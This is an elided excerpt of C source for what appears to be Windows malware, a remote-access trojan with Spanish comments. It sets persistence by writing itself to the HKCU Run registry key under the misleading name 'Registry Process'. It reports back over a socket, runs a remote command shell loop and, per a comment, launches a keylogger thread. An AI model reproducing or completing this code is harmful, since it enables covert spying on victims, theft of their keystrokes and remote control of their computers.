...
int bootRun(){
	char err[128] = "Fallo \n";
	char suc[128] = "Exito en persistencia en: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	...
	if (RegSetValueEx(NewVal, TEXT("Registry Process"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
...
void Shell(){
	...
	while (1){
		...
		if (strncmp("q", buffer, 1) == 0) {
			...
			//Creamos un hilo aparte para que el keylogger no corte las demas acciones
